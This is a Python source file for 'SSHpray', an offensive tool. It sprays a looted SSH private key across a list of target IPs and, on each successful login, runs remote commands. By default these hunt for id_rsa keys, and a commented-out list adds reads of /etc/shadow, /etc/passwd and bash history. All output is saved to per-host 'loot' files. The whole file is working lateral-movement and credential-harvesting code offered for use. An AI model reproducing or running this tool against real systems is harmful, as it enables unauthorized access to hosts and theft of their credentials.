#!/usr/bin/env python
try:
    import argparse, os, re, signal, socket, string, subprocess, sys, time, paramiko
    from urlparse import urlparse
    from subprocess import Popen, PIPE, STDOUT 
except Exception as e:
    print('\n[!] Import(s) failed! ' + str(e))

class SSHpray():

    def __init__(self, args):

        #defaults
        #record start time
        self.startTime = time.time()
        #pass in args. this is messy
        self.args = args
        #verbosity explicitly off
        self.verbose = False
        #version
        self.version ='beta.08_06_2017'
        #default 5 second timeout for ssh
        self.timeout = int(5)
        #eventually we'll support >1 key
        self.private_keys = []
        #init target file 
        self.targets_file = None
        #targets from file go into the list
        self.target_list = []
        #target set is used for valid IPs
        self.target_set = set()
        #init username as none, default will apply current user if no -u
        self.user_name = None
        #record stdout from successful ssh command, will output later
        self.ssh_result = []
        #dump reports here
        self.report_dir = './reports/'
        if not os.path.exists(self.report_dir):
            os.makedirs(self.report_dir)
        #loot dir
        self.loot_dir = './loot/'
        if not os.path.exists(self.loot_dir):
            os.makedirs(self.loot_dir)
        #command(s) to run. assumes bash, this is probably a stupid assumption
        #self.remote_commands = ['sudo locate id_rsa','tail -n 50 ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','last;','exit']
        self.remote_commands = ['sudo locate id_rsa', 'locate id_rsa']

    #attempts to validate user supplied args
    def check_args(self, parser):
        #print version and supplied args if verbose
        if self.args.verbose is True: print(\
            '[i] Version: {}\n[i] Options: {}'.format(self.version,parser.parse_args()))

        if self.args.keyfile is None:
            print('\n[!]Please provide an unencrypted SSH private key file with -k\n')
            parser.print_help()
            sys.exit(1)

        #require at least one argument to provide targets
        if not (self.args.targets or self.args.ipaddress):
            print('\n[!] No scope provided, add a file with IPs with -f or IP address(es) with -i\n')
            parser.print_help()
            sys.exit(1)

        #if a file is supplied open it with read_targets function
        if self.args.targets is not None:
            print('[i] Opening targets file: {}'.format(self.args.targets))
            self.targets_file = self.args.targets
            #call read_targets function which will check if the file lines are valid
            self.read_targets()
        
        #if ip address isnt blank
        if self.args.ipaddress is not None: 
            self.target_list.append(''.join(self.args.ipaddress))

        if self.args.username is None:
            self.user_name = os.getlogin()
        else:
            self.user_name = self.args.username

        if self.args.commands is not None:
            self.remote_commands=[]
            self.remote_commands.append(''.join(self.args.commands))

        if self.args.delay is not None:
            self.timeout = float(''.join(self.args.delay))

    def read_targets(self):
        #open targets file
        with open(self.args.targets) as f:
            targets = f.readlines()
            #add to target list, strip stuff
            for x in targets:
                self.target_list.append(x.strip())

        #need to expand cidr and filter rfc1918, etc    
        #show user target set of unique IPs
        if self.args.verbose is True:print('[i] Reconciled target list:')
        if self.args.verbose is True:print(', '.join(self.target_list))
        print('[i] All targets are valid IP addresses')
    

    
    def signal_handler(self, signal, frame):
        print('You pressed Ctrl+C! Exiting...')
        sys.exit(0)
    
    def cls(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print('SSHpray started at: {}'.format(time.strftime('%m/%d/%Y - %H:%M:%S')))
    
    def connect(self):

        pattern = re.compile('[\W_]+')
        pattern.sub('', string.printable)

        signal.signal(signal.SIGINT, self.signal_handler)
        with open(self.args.keyfile) as f:
            private_key = f.readlines()
        print('[i] Using Private Key: {} and username {}'.format(self.args.keyfile, self.user_name))
        for i, t in enumerate(self.target_list):
            if self.args.verbose is True: print ('[i] Attempting to SSH to {}'.format(t) )
            try:#Initialize SSH session to host via paramiko and run the command contents
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(t, username = self.args.username, key_filename = self.args.keyfile, timeout=self.timeout)
                print('[+] SUCCESS: {}'.format(t))
                for c in self.remote_commands:
                    #print('Running {}'.formatc)
                    stdin, stdout, stderr = ssh.exec_command(c)
                    #server response not working for some reason
                    print ('[+] {} responded to {} with: \n'.format(t,c))

                    output = ''.join(stdout.readlines())
                    print (output)

                    #create dir if missing
                    if not os.path.exists(self.loot_dir+str(t)):
                        os.makedirs(self.loot_dir+str(t))

                    #save output to a file 
                    c = c.translate(None, '~!@#$%^&*()_+`-=[]\|/?.,:;<>')
                    with open(self.loot_dir+t+'/'+str(c)+'_loot.txt', 'w') as loot_file:
                        loot_file.writelines(output)


                    print('\n')
                ssh.close()
                print ('[+] SSH Session to {} closed'.format(t))
            except Exception as e:
                print('[!] {:15} : {}'.format(t,e))
                pass

def main():
    #gather options
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--commands', metavar='<command>', help='command to run')
    parser.add_argument('-d', '--delay', metavar='<delay>', help='set timeout delay in seconds, default is 5 seconds')
    parser.add_argument('-i', '--ipaddress', metavar='<ip address>', help='single ip to test')
    parser.add_argument('-k', '--keyfile', metavar='<keyfile>', help='private key that you have looted')
    parser.add_argument('-t', '--targets', metavar='<targetfile>', help='list of ssh servers in a file, one per line')
    parser.add_argument('-u', '--username', metavar='<username>', help='username associated with key, default is current local user')
    parser.add_argument('-v', '--verbose', help='Optionally enable verbosity', action = 'store_true')
    args = parser.parse_args()
    run = SSHpray(args)
    run.cls()
    run.check_args(parser)
    run.connect()

if __name__ == '__main__':
    main()
